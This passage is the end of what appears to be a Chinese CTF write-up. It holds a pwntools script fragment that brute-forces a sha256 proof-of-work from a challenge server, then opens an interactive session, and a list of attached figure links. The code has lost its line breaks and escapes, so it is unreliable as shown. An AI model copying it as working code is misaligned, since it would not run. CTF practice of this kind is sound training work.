table = string.printableio.recvuntil(b'sha256(')prefix = io.recvuntil(b' + xxxx) = ', drop=True).decode()h = io.recvuntil(b'n', drop=True).decode()
proof = mbruteforce(lambda x: sha256((prefix+x).encode()).hexdigest() == h, table, length=4, method='fixed')io.sendlineafter(b'xxxx =', proof.encode())
io.interactive()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/6-1671696720.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/4-1671696720.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/10-1671696721.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/4-1671696722.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/1-1671696726.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/12/2-1671696726.png)